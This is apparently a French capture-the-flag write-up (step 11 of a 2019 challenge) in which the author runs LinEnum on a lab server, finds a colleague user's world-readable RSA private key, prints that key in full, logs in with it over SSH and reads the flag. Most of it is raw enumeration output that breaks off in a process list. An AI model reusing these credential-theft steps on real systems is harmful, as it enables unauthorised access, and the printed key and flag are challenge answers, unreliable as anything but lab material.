# Step 11

## violet's mail

dans la step d'avant en se connectant il était écrit qu'on avait reçu un mail, le voila:

```bash
violet@SRV02-BACKUP:/var/mail$ cat /var/mail/violet
From georgina@srv02-backup Wed Jun 26 12:25:15 2019
Return-path: <georgina@srv02-backup>
Envelope-to: root@srv02-backup
Delivery-date: Wed, 26 Jun 2019 12:25:15 +0200
Received: from georgina by SRV02-BACKUP with local (Exim 4.89)
	(envelope-from <georgina@srv02-backup>)
	id 1hg574-0004NQ-P1
	for root@srv02-backup; Wed, 26 Jun 2019 12:25:15 +0200
To: root@srv02-backup
Auto-Submitted: auto-generated
Subject: *** SECURITY information for SRV02-BACKUP ***
From:  <georgina@srv02-backup>
Message-Id: <E1hg574-0004NQ-P1@SRV02-BACKUP>
Date: Wed, 26 Jun 2019 12:25:14 +0200

SRV02-BACKUP : Jun 26 12:25:14 : georgina : user NOT in sudoers ; TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/su


From georgina@srv02-backup Thu Jun 27 10:42:06 2019
Return-path: <georgina@srv02-backup>
Envelope-to: root@srv02-backup
Delivery-date: Thu, 27 Jun 2019 10:42:06 +0200
Received: from georgina by SRV02-BACKUP with local (Exim 4.89)
	(envelope-from <georgina@srv02-backup>)
	id 1hgPyo-0004cI-66
	for root@srv02-backup; Thu, 27 Jun 2019 10:42:06 +0200
To: root@srv02-backup
Auto-Submitted: auto-generated
Subject: *** SECURITY information for SRV02-BACKUP ***
From:  <georgina@srv02-backup>
Message-Id: <E1hgPyo-0004cI-66@SRV02-BACKUP>
Date: Thu, 27 Jun 2019 10:42:06 +0200

SRV02-BACKUP : Jun 27 10:42:06 : georgina : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/georgina ; USER=root ; COMMAND=/bin/su


From georgina@srv02-backup Thu Jun 27 10:42:12 2019
Return-path: <georgina@srv02-backup>
Envelope-to: root@srv02-backup
Delivery-date: Thu, 27 Jun 2019 10:42:12 +0200
Received: from georgina by SRV02-BACKUP with local (Exim 4.89)
	(envelope-from <georgina@srv02-backup>)
	id 1hgPyu-0004cO-4W
	for root@srv02-backup; Thu, 27 Jun 2019 10:42:12 +0200
To: root@srv02-backup
Auto-Submitted: auto-generated
Subject: *** SECURITY information for SRV02-BACKUP ***
From:  <georgina@srv02-backup>
Message-Id: <E1hgPyu-0004cO-4W@SRV02-BACKUP>
Date: Thu, 27 Jun 2019 10:42:12 +0200

SRV02-BACKUP : Jun 27 10:42:12 : georgina : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/georgina ; USER=root ; COMMAND=root
```

en fait osef des mails.

## basic enum

donc on lance encore un LinEnum et on voit que la clé rsa de georgina est world readable:

```bash
./LinEnum.sh -s -r report -e /dev/shm -t

[...]
[-] World-readable files within /home:
-rw-r--r-- 1 violet violet 220 juin  21 17:22 /home/violet/.bash_logout
-rw-r--r-- 1 violet violet 675 juin  21 17:22 /home/violet/.profile
-rw-r--r-- 1 violet violet 222 juin  27 11:36 /home/violet/.ssh/known_hosts
-rw-r--r-- 1 violet violet 400 juin  26 18:12 /home/violet/.ssh/authorized_keys
-rw-r--r-- 1 violet violet 3520 juin  27 11:13 /home/violet/.bashrc
-rw-r--r-- 1 georgina georgina 220 juil.  1 17:36 /home/georgina/.bash_logout
-rw-r--r-- 1 georgina georgina 675 juil.  1 17:36 /home/georgina/.profile
-rw-r--r-- 1 georgina georgina 1675 juin  27 11:20 /home/georgina/.ssh/id_rsa_georgina
-rw-r--r-- 1 georgina georgina 444 juil.  3 12:00 /home/georgina/.ssh/known_hosts
-rw-r--r-- 1 georgina georgina 399 juin  27 11:20 /home/georgina/.ssh/authorized_keys
-rw-r--r-- 1 georgina georgina 399 juin  27 11:20 /home/georgina/.ssh/id_rsa_georgina.pub
-rw-r--r-- 1 georgina georgina 3520 juil.  1 17:32 /home/georgina/.bashrc
[...]
```

## rsa key 

```bash
cat /home/georgina/.ssh/id_rsa_georgina
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA52c0qg1fbh+qRggKuqz8fwC9jsY1qJXg/eG+jl1D1206g3B9
nAu5rf1TiS7FrH8JveMIDgRVJVTVmufHIGzOUPDJU8Gm0W7w3DVd7OPLKW18FEQy
xT0dFzdDbSiz/9xQPXaJmrjV5kTG8rlfALmI8Otd2GLvSIC1rZ2GhJaAgjBPhML3
SbjJXq05LfRGhVNgULIcc9BUPKLAIoEkWQ570iebf3hiYhpyqLIH7nu+H7KpRp16
HRKiaN4g6Y6DxBEssAQLDSe7kc4y8HylfEYeGWoIPj0UroT4zWkLHNaCpZQnNjB1
896BgX837IjCmRmMeYSYdp7INOZakG7ldk/p1QIDAQABAoIBAB4gHYcV/pqDnNNJ
MLxk0Opn2kXAIDQ2bvgeb4RxN+fP3JJIDtJF5IJ2PG3bnPh8AXSrHd1VSxB1Hunv
ysi54ZJABrXUvDb/znOcrwGsFkLqcgDhcAqljif7ldecOPLSZ8/Yosl1zsMPqSbo
Yyng/ab/vVPybVxvBTf5Dg4s2cYY7J7Q9+LSpSR4+qKpdShMWtWM/NkigxEzotmm
xY+YhmYPSncYtGQFBFez95D6eRozK0xLqFu9wX8mnMmtf4EHUoDyrgcJdhU9iGJK
rH8j+y1cf5mw1ikOD1miaQdG+ONLb5BQ2Za+1qHevPUH8xGAnFx/7H/sxmAu81+2
IhfWfwECgYEA+A+nXBjqftnfaVl5X/Bv+6unuYaaQHxxc4mEzC2OObNk9wL0VziW
c9KlyIYun1pgnXDKCc9HutsD6+YJpc5jhI6cK7sy4LpMqZ79vzzK0vmH3Paj8MhO
89OaMJIk584MNvbCf4lbMfsnvjUYV24MT0x+T4kfvFKYO6inq4FRNWUCgYEA7s8T
APkKiqKf/c7WHtFVE7HjTvCXSUmnJ/QIAoaIXBYwNDJ9N8mUES1phjCr32F07T8d
HE8Mozx59DHlzoV++8aEG4SepdUd/ftZut3kXD831WaMyGNiS1DjiXp9wHW0vV4F
m+8e7wIo8YCQOHoIn1FhtYyaV3eRlaTh77ntk7ECgYB3e5rCSqIQrcLlzJog8wAN
ehYUz9fWvdorq46ShlLeSiGUtRCaPoCBk3IVD0S/rtmgnCZE6VmEkF/oLWpyOeJH
hCWHDuknw7SPcyyIA7EyQ80ESqyWmvUkjsTTJmGuYdoSU3NF2RRbE72F6a8q1bAK
Ni8VAliN7j6zZb41ZtmF3QKBgEBsfKP2i3F7Dc5azkjiECGQC9Jv9WBADmgo3UBR
Ktgs5DQwqrcyGk/IAH/DAZrxn6mhLSlF6hLfbccC7wwX13n0xA7oaCQ0qjKqbDqN
Qd3g8B8R20j0BsBqwfeEpAgXuPqdMsYubBnuaz07gay6vzi7q7BejgSqrQvBv3H8
pqsBAoGADf/iIdk7NzkYQZetRfaPX4q9fvuMAz5qtMpiLZ+Hgs4IXSsDilQDqlJU
tYwxziaLeonU2X9D92WNBW9Bm5N0flfD58bUcM+0FbpLOnB9AQ6TDQ0xqIz7YoQy
+IsrauZF5YEKg+UPerckYqW9pC9PpqI/aw++9nBeHNiT6YP6QQQ=
-----END RSA PRIVATE KEY-----
```

## connection as georgina

```bash
ssh -i /home/maki/Documents/wonkachall2019/step11/id_rsa georgina@172.16.69.65
Linux SRV02-BACKUP 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul  8 11:04:07 2019 from 10.9.0.10
georgina@SRV02-BACKUP:~$ 
```

## flag

```bash
georgina@SRV02-BACKUP:~$ cat flag-11.txt 
5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5
```


---

complete linenum

```violet@SRV02-BACKUP:/dev/shm$ ./LinEnum.sh -s -r report -e /dev/shm -t

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.96

[-] Debug Info
[+] Report name = report-19-07-19
[+] Export location = /dev/shm
[+] Thorough tests = Enabled
[+] Please enter password - INSECURE - really only for CTF use!



Scan started at:
vendredi 19 juillet 2019, 15:25:37 (UTC+0200)


### SYSTEM ##############################################
[-] Kernel information:
Linux SRV02-BACKUP 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.9.0-9-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16)


[-] Specific release information:
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"


[-] Hostname:
SRV02-BACKUP


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1000(violet) gid=1000(violet) groupes=1000(violet),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1002(lshell)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             pts/5    10.9.0.10        lun. juil.  8 11:04:15 +0200 2019
violet           pts/6    10.8.0.26        ven. juil. 19 15:16:07 +0200 2019
georgina         pts/4    10.9.0.10        lun. juil.  8 11:04:07 +0200 2019


[-] Who else is logged on:
 15:25:37 up  6:51,  7 users,  load average: 0,00, 0,00, 0,00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
georgina pts/0    10.8.0.10        08juil.19 11days  0.04s  0.04s -bash
violet   pts/1    10.8.0.26        15:16    8:15   0.04s  0.02s bash
root     pts/2    10.9.0.10        08juil.19 11days  0.17s  0.17s -bash
georgina pts/3    10.8.0.10        08juil.19 11days  0.04s  0.00s sshd: georgina [priv]
georgina pts/4    10.9.0.10        08juil.19 11days  0.03s  0.03s -bash
root     pts/5    10.9.0.10        08juil.19 11days  0.06s  0.06s -bash
violet   pts/6    10.8.0.26        15:16    0.00s  0.08s  0.00s /bin/bash ./LinEnum.sh -s -r report -e


[-] Group memberships:
uid=0(root) gid=0(root) groupes=0(root)
uid=1(daemon) gid=1(daemon) groupes=1(daemon)
uid=2(bin) gid=2(bin) groupes=2(bin)
uid=3(sys) gid=3(sys) groupes=3(sys)
uid=4(sync) gid=65534(nogroup) groupes=65534(nogroup)
uid=5(games) gid=60(games) groupes=60(games)
uid=6(man) gid=12(man) groupes=12(man)
uid=7(lp) gid=7(lp) groupes=7(lp)
uid=8(mail) gid=8(mail) groupes=8(mail)
uid=9(news) gid=9(news) groupes=9(news)
uid=10(uucp) gid=10(uucp) groupes=10(uucp)
uid=13(proxy) gid=13(proxy) groupes=13(proxy)
uid=33(www-data) gid=33(www-data) groupes=33(www-data)
uid=34(backup) gid=34(backup) groupes=34(backup)
uid=38(list) gid=38(list) groupes=38(list)
uid=39(irc) gid=39(irc) groupes=39(irc)
uid=41(gnats) gid=41(gnats) groupes=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groupes=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groupes=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groupes=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groupes=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groupes=105(systemd-bus-proxy)
uid=104(_apt) gid=65534(nogroup) groupes=65534(nogroup)
uid=105(Debian-exim) gid=109(Debian-exim) groupes=109(Debian-exim)
uid=106(messagebus) gid=110(messagebus) groupes=110(messagebus)
uid=107(sshd) gid=65534(nogroup) groupes=65534(nogroup)
uid=1000(violet) gid=1000(violet) groupes=1000(violet),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1002(lshell)
uid=1001(georgina) gid=1001(georgina) groupes=1001(georgina)
uid=108(statd) gid=65534(nogroup) groupes=65534(nogroup)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
Debian-exim:x:105:109::/var/spool/exim4:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
violet:x:1000:1000:violet,,,:/home/violet:/usr/bin/lshell
georgina:x:1001:1001::/home/georgina:/bin/bash
statd:x:108:65534::/var/lib/nfs:/bin/false


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 16K
drwxr-xr-x  4 root     root     4,0K juin  26 18:10 .
drwxr-xr-x 22 root     root     4,0K juin  21 17:06 ..
drwxr-xr-x  3 georgina georgina 4,0K juil.  5 14:57 georgina
drwxr-xr-x  3 violet   violet   4,0K juil.  5 14:39 violet



[-] Files owned by our user:
-rw-rw---- 1 violet mail 2084 juin  27 10:42 /var/mail/violet
-rw-r--r-- 1 violet violet 1531 juil. 19 15:25 /dev/shm/LinEnum-export-19-07-19/etc-export/passwd
-rw-r--r-- 1 violet violet 6220 juil. 19 15:25 /dev/shm/report-19-07-19
-rwxr-xr-x 1 violet violet 45639 juil.  2 17:47 /dev/shm/LinEnum.sh
-rw-r--r-- 1 violet violet 171 juil.  5 14:00 /usr/local/share/golden_tickets/krbtgt-laureole
-rw------- 1 violet violet 0 juil. 19 15:15 /usr/local/share/golden_tickets/.lhistory
-rw-r--r-- 1 violet violet 167 juil.  5 14:00 /usr/local/share/golden_tickets/krbtgt-LHVM
-rw-r--r-- 1 violet violet 169 juil.  5 14:00 /usr/local/share/golden_tickets/krbtgt-virage
-rw-r--r-- 1 violet violet 171 juil.  5 14:00 /usr/local/share/golden_tickets/krbtgt-subtotal
-rw-r--r-- 1 violet violet 169 juil.  5 14:00 /usr/local/share/golden_tickets/krbtgt-citron
-rw-r--r-- 1 violet violet 169 juil.  5 14:00 /usr/local/share/golden_tickets/krbtgt-eaugazeuse
-rw-r--r-- 1 violet violet 168 juil.  5 14:00 /usr/local/share/golden_tickets/krbtgt-curry
-rw------- 1 violet violet 0 juin  27 11:38 /home/violet/.bash_history
-rw-r--r-- 1 violet violet 220 juin  21 17:22 /home/violet/.bash_logout
-rw-r--r-- 1 violet violet 675 juin  21 17:22 /home/violet/.profile
-rw-r--r-- 1 violet violet 222 juin  27 11:36 /home/violet/.ssh/known_hosts
-rw-r--r-- 1 violet violet 400 juin  26 18:12 /home/violet/.ssh/authorized_keys
-rw-r--r-- 1 violet violet 3520 juin  27 11:13 /home/violet/.bashrc
-r-------- 1 violet violet 65 juil.  3 16:00 /home/violet/flag-10.txt


[-] Hidden files:
-rw-r--r-- 1 root root 102 oct.   7  2017 /etc/cron.weekly/.placeholder
-rw-r--r-- 1 root root 102 oct.   7  2017 /etc/cron.d/.placeholder
-rw-r--r-- 1 root root 220 mai   15  2017 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 675 mai   15  2017 /etc/skel/.profile
-rw-r--r-- 1 root root 3526 mai   15  2017 /etc/skel/.bashrc
-rw-r--r-- 1 root root 102 oct.   7  2017 /etc/cron.daily/.placeholder
-rw-r--r-- 1 root root 102 oct.   7  2017 /etc/cron.monthly/.placeholder
-rw-r--r-- 1 root root 102 oct.   7  2017 /etc/cron.hourly/.placeholder
-rw------- 1 root root 0 juin  21 17:04 /etc/.pwd.lock
-rw-r--r-- 1 root staff 45 juin  27 10:50 /usr/local/lshell/.gitignore
-rw-r--r-- 1 root staff 177 juin  27 10:50 /usr/local/lshell/.travis.yml
-rw------- 1 violet violet 0 juil. 19 15:15 /usr/local/share/golden_tickets/.lhistory
-rw-r--r-- 1 root root 0 juil.  4 14:55 /run/network/.ifstate.lock
-rw------- 1 violet violet 0 juin  27 11:38 /home/violet/.bash_history
-rw-r--r-- 1 violet violet 220 juin  21 17:22 /home/violet/.bash_logout
-rw-r--r-- 1 violet violet 675 juin  21 17:22 /home/violet/.profile
-rw-r--r-- 1 violet violet 3520 juin  27 11:13 /home/violet/.bashrc
-rw------- 1 georgina georgina 0 juil.  1 17:42 /home/georgina/.bash_history
-rw-r--r-- 1 georgina georgina 220 juil.  1 17:36 /home/georgina/.bash_logout
-rw-r--r-- 1 georgina georgina 675 juil.  1 17:36 /home/georgina/.profile
-rw-r--r-- 1 georgina georgina 3520 juil.  1 17:32 /home/georgina/.bashrc


[-] World-readable files within /home:
-rw-r--r-- 1 violet violet 220 juin  21 17:22 /home/violet/.bash_logout
-rw-r--r-- 1 violet violet 675 juin  21 17:22 /home/violet/.profile
-rw-r--r-- 1 violet violet 222 juin  27 11:36 /home/violet/.ssh/known_hosts
-rw-r--r-- 1 violet violet 400 juin  26 18:12 /home/violet/.ssh/authorized_keys
-rw-r--r-- 1 violet violet 3520 juin  27 11:13 /home/violet/.bashrc
-rw-r--r-- 1 georgina georgina 220 juil.  1 17:36 /home/georgina/.bash_logout
-rw-r--r-- 1 georgina georgina 675 juil.  1 17:36 /home/georgina/.profile
-rw-r--r-- 1 georgina georgina 1675 juin  27 11:20 /home/georgina/.ssh/id_rsa_georgina
-rw-r--r-- 1 georgina georgina 444 juil.  3 12:00 /home/georgina/.ssh/known_hosts
-rw-r--r-- 1 georgina georgina 399 juin  27 11:20 /home/georgina/.ssh/authorized_keys
-rw-r--r-- 1 georgina georgina 399 juin  27 11:20 /home/georgina/.ssh/id_rsa_georgina.pub
-rw-r--r-- 1 georgina georgina 3520 juil.  1 17:32 /home/georgina/.bashrc


[-] Home directory contents:
total 28K
drwxr-xr-x 3 violet violet 4,0K juil.  5 14:39 .
drwxr-xr-x 4 root   root   4,0K juin  26 18:10 ..
-rw------- 1 violet violet    0 juin  27 11:38 .bash_history
-rw-r--r-- 1 violet violet  220 juin  21 17:22 .bash_logout
-rw-r--r-- 1 violet violet 3,5K juin  27 11:13 .bashrc
-r-------- 1 violet violet   65 juil.  3 16:00 flag-10.txt
-rw-r--r-- 1 violet violet  675 juin  21 17:22 .profile
drwxr-xr-x 2 violet violet 4,0K juin  27 11:36 .ssh


[-] SSH keys/host information found in the following locations:
-rw-r--r-- 1 violet violet 399 juil. 19 15:26 /dev/shm/LinEnum-export-19-07-19/wr-files/home/georgina/.ssh/id_rsa_georgina.pub
-rw-r--r-- 1 violet violet 399 juil. 19 15:26 /dev/shm/LinEnum-export-19-07-19/wr-files/home/georgina/.ssh/authorized_keys
-rw-r--r-- 1 violet violet 444 juil. 19 15:26 /dev/shm/LinEnum-export-19-07-19/wr-files/home/georgina/.ssh/known_hosts
-rw-r--r-- 1 violet violet 1675 juil. 19 15:26 /dev/shm/LinEnum-export-19-07-19/wr-files/home/georgina/.ssh/id_rsa_georgina
-rw-r--r-- 1 violet violet 400 juil. 19 15:26 /dev/shm/LinEnum-export-19-07-19/wr-files/home/violet/.ssh/authorized_keys
-rw-r--r-- 1 violet violet 222 juil. 19 15:26 /dev/shm/LinEnum-export-19-07-19/wr-files/home/violet/.ssh/known_hosts
-rw-r--r-- 1 violet violet 222 juin  27 11:36 /home/violet/.ssh/known_hosts
-rw-r--r-- 1 violet violet 400 juin  26 18:12 /home/violet/.ssh/authorized_keys
-rw-r--r-- 1 georgina georgina 1675 juin  27 11:20 /home/georgina/.ssh/id_rsa_georgina
-rw-r--r-- 1 georgina georgina 444 juil.  3 12:00 /home/georgina/.ssh/known_hosts
-rw-r--r-- 1 georgina georgina 399 juin  27 11:20 /home/georgina/.ssh/authorized_keys
-rw-r--r-- 1 georgina georgina 399 juin  27 11:20 /home/georgina/.ssh/id_rsa_georgina.pub


### ENVIRONMENTAL #######################################
[-] Environment information:
LC_MEASUREMENT=fr_FR.UTF-8
SSH_CONNECTION=10.8.0.26 45206 172.16.69.65 22
LC_PAPER=fr_FR.UTF-8
LC_MONETARY=fr_FR.UTF-8
LANG=fr_FR.UTF-8
OLDPWD=/tmp
LC_NAME=fr_FR.UTF-8
XDG_SESSION_ID=33
USER=violet
PWD=/dev/shm
LINES=27
HOME=/home/violet
SSH_CLIENT=10.8.0.26 45206 22
LC_ADDRESS=fr_FR.UTF-8
LC_NUMERIC=fr_FR.UTF-8
SSH_TTY=/dev/pts/6
COLUMNS=104
MAIL=/var/mail/violet
TERM=xterm-256color
SHELL=/usr/bin/lshell
LSHELL_ARGS=['--config', '/etc/lshell.conf']
SHLVL=2
LC_TELEPHONE=fr_FR.UTF-8
LOGNAME=violet
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/bin:/usr/bin:/bin:/usr/games
LC_IDENTIFICATION=fr_FR.UTF-8
LC_TIME=fr_FR.UTF-8
_=/usr/bin/env


[-] Path information:
/usr/local/bin:/usr/bin:/bin:/usr/games


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash


[-] Current umask value:
0022
u=rwx,g=rx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 oct.   7  2017 /etc/crontab

/etc/cron.d:
total 12
drwxr-xr-x  2 root root 4096 juin  21 17:11 .
drwxr-xr-x 80 root root 4096 juil.  5 14:56 ..
-rw-r--r--  1 root root  102 oct.   7  2017 .placeholder

/etc/cron.daily:
total 44
drwxr-xr-x  2 root root 4096 juin  21 17:15 .
drwxr-xr-x 80 root root 4096 juil.  5 14:56 ..
-rwxr-xr-x  1 root root 1474 janv. 18 11:42 apt-compat
-rwxr-xr-x  1 root root  355 oct.  25  2016 bsdmainutils
-rwxr-xr-x  1 root root 1597 juin  26  2018 dpkg
-rwxr-xr-x  1 root root 4125 mai   28 22:13 exim4-base
-rwxr-xr-x  1 root root   89 mai    6  2015 logrotate
-rwxr-xr-x  1 root root 1065 déc.  13  2016 man-db
-rwxr-xr-x  1 root root  249 mai   17  2017 passwd
-rw-r--r--  1 root root  102 oct.   7  2017 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 juin  21 17:05 .
drwxr-xr-x 80 root root 4096 juil.  5 14:56 ..
-rw-r--r--  1 root root  102 oct.   7  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 juin  21 17:05 .
drwxr-xr-x 80 root root 4096 juil.  5 14:56 ..
-rw-r--r--  1 root root  102 oct.   7  2017 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 juin  21 17:15 .
drwxr-xr-x 80 root root 4096 juil.  5 14:56 ..
-rwxr-xr-x  1 root root  723 déc.  13  2016 man-db
-rw-r--r--  1 root root  102 oct.   7  2017 .placeholder


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Systemd timers:
NEXT                          LEFT          LAST                          PASSED             UNIT                         ACTIVATES
Fri 2019-07-19 20:54:44 CEST  5h 28min left Fri 2019-07-19 15:02:17 CEST  24min ago          apt-daily.timer              apt-daily.service
Sat 2019-07-20 06:26:02 CEST  14h left      Fri 2019-07-19 15:02:17 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
Sat 2019-07-20 08:49:25 CEST  17h left      Fri 2019-07-05 10:53:49 CEST  2 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

3 timers listed.



### NETWORKING  ##########################################
[-] Network and IP info:
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens18: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 96:2e:20:a6:a0:f3 brd ff:ff:ff:ff:ff:ff
    inet 172.16.69.65/24 brd 172.16.69.255 scope global ens18
       valid_lft forever preferred_lft forever
    inet6 fe80::942e:20ff:fea6:a0f3/64 scope link 
       valid_lft forever preferred_lft forever


[-] ARP history:
172.16.69.23 dev ens18 lladdr ce:d3:94:6c:38:3f REACHABLE
172.16.69.78 dev ens18 lladdr 7a:0a:61:1a:36:65 STALE
172.16.69.254 dev ens18 lladdr 3e:20:13:a5:09:49 DELAY


[-] Nameserver(s):
nameserver 172.16.69.254


[-] Nameserver(s):
Global
         DNS Servers: 172.16.69.254
          DNSSEC NTA: 10.in-addr.arpa
                      16.172.in-addr.arpa
                      168.192.in-addr.arpa
                      17.172.in-addr.arpa
                      18.172.in-addr.arpa
                      19.172.in-addr.arpa
                      20.172.in-addr.arpa
                      21.172.in-addr.arpa
                      22.172.in-addr.arpa
                      23.172.in-addr.arpa
                      24.172.in-addr.arpa
                      25.172.in-addr.arpa
                      26.172.in-addr.arpa
                      27.172.in-addr.arpa
                      28.172.in-addr.arpa
                      29.172.in-addr.arpa
                      30.172.in-addr.arpa
                      31.172.in-addr.arpa
                      corp
                      d.f.ip6.arpa
                      home
                      internal
                      intranet
                      lan
                      local
                      private
                      test

Link 2 (ens18)
      Current Scopes: LLMNR/IPv4 LLMNR/IPv6
       LLMNR setting: yes
MulticastDNS setting: no
      DNSSEC setting: no
    DNSSEC supported: no


[-] Default route:
default via 172.16.69.254 dev ens18 onlink 


[-] Listening TCP:
State      Recv-Q Send-Q Local Address:Port                 Peer Address:Port                
ESTAB      0      0      172.16.69.65:ssh                  10.8.0.10:38224                
ESTAB      0      0      172.16.69.65:691                  172.16.69.23:nfs                  
ESTAB      0      0      172.16.69.65:ssh                  10.9.0.10:45190                
ESTAB      0      0      172.16.69.65:ssh                  10.8.0.10:59074                
ESTAB      0      0      172.16.69.65:ssh                  10.8.0.26:45206                
ESTAB      0      0      172.16.69.65:ssh                  10.8.0.26:45202                
ESTAB      0      0      172.16.69.65:ssh                  10.9.0.10:45182                
ESTAB      0      0      172.16.69.65:ssh                  10.9.0.10:41698                


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1  57064  6756 ?        Ss   08:33   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    08:33   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    08:33   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   08:33   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    08:33   0:00 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    08:33   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    08:33   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S<   08:33   0:00 [lru-add-drain]
root        11  0.0  0.0      0     0 ?        S    08:33   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    08:33   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    08:33   0:00 [cpuhp/1]
root        14  0.0  0.0      0     0 ?        S    08:33   0:00 [watchdog/1]
root        15  0.0  0.0      0     0 ?        S    08:33   0:00 [migration/1]
root        16  0.0  0.0      0     0 ?        S    08:33   0:00 [ksoftirqd/1]
root        18  0.0  0.0      0     0 ?        S<   08:33   0:00 [kworker/1:0H]
root        19  0.0  0.0      0     0 ?        S    08:33   0:00 [kdevtmpfs]
root        20  0.0  0.0      0     0 ?        S<   08:33   0:00 [netns]
root        21  0.0  0.0      0     0 ?        S    08:33   0:00 [khungtaskd]
root        22  0.0  0.0      0     0 ?        S    08:33   0:00 [oom_reaper]
